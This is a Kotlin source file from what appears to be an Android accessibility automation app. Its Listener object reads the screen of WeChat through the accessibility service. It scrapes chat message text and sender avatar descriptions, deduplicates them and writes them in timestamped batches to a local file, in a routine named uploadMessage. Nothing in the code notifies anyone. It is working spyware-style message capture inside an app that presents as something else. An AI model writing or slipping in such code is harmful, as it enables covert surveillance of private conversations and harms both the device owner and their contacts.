package li.songe.gkd.a11y

import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.blankj.utilcode.util.LogUtils
import li.songe.gkd.service.A11yService
import li.songe.gkd.a11y.utils.appListenerFile
import li.songe.gkd.a11y.utils.appendTime
import kotlin.math.min

object Listener {
    private val TAG = "Listener"
    private var lastRead = System.currentTimeMillis()
    private val messageList = ArrayList<String>()
    private val allMessageList = ArrayList<String>()
    private val sleepDefault = 5 * 1000
    private val friendSleep = 1000 * 10 * 2
    private var sleep = sleepDefault
    private var uploading = false

    fun onAccessibilityEvent(
        event: AccessibilityEvent?,
    ) {
        val rootInActiveWindow = A11yService.instance?.safeActiveWindow
        AppUseListener.onAccessibilityEvent(event, rootInActiveWindow)
        QListener.onAccessibilityEvent(event, rootInActiveWindow)

        if (event?.packageName.toString() != "com.tencent.mm") return
        if ((System.currentTimeMillis() - lastRead) < sleep) return
        if (messageList.size > 100 && !uploading) {
            allMessageList.addAll(messageList)
            uploadMessage()
            if (allMessageList.size > 100 * 1000) allMessageList.clear()
        }
        rootInActiveWindow?.let {
            lastRead = System.currentTimeMillis()
            sleep = sleepDefault
            Log.d(TAG, "wechat start")
            printInfo(it)
        }
    }

    private fun printInfo(
        node: AccessibilityNodeInfo?,
        prefix: String = "",
        isLast: Boolean = false,
    ) {
        if (node == null) return
        val className = node.className.toString()
        if (className == "android.widget.TextView" || className == "android.widget.ImageView") {
            val id = node.viewIdResourceName
            if (id != null) {
                if (className == "android.widget.TextView") {
                    val content = node.text?.toString() ?: ""
                    if (content.isNotEmpty()) {
                        if (content == "浮窗") return
                        if (content == "朋友圈") {
                            sleep = friendSleep
                            return
                        }

                        addMessage(content)
                    }
                } else {
                    val currentHeader = node.contentDescription?.toString() ?: ""
                    if (currentHeader.isNotEmpty()) {
                        if (messageList.lastOrNull() != currentHeader) {
                            if (messageList.size > 1 && messageList[messageList.size - 2] != currentHeader) {
                                messageList.add(currentHeader)
                            }
//                            Log.d("printNodeInfo", currentHeader)
                        }
                    }

                }
            }
        }


        val size = node.childCount
        if (size > 0) {
            val childPrefix = prefix + if (isLast) "  " else "|  "
            val lastChildIndex = size - 1
            for (index in 0 until size) {
                val isLastChild = index == lastChildIndex
                printInfo(node.getChild(index), childPrefix, isLastChild)
            }
        }
    }

    private fun uploadMessage() {
        uploading = true
        var liveMessage = ""
        messageList.map { liveMessage = "$liveMessage\n$it" }
        messageList.clear()
        appListenerFile.appendText(liveMessage)
        appListenerFile.appendTime()
        uploading = false
    }

    private fun addMessage(message: String) {
        if (messageList.contains(message) || allMessageList.contains(message)) {
            return
        }
//        Log.d("printNodeInfo", message)
        messageList.add(message)
    }
}

data class NodeWrapper(
    var className: String?,
    var text: String? = null,
    var id: String? = null,
    var description: String? = null,
    var nodeInfo: AccessibilityNodeInfo? = null
) {
    override fun toString() = "className = $className → text = $text → id = $id → description = $description"
}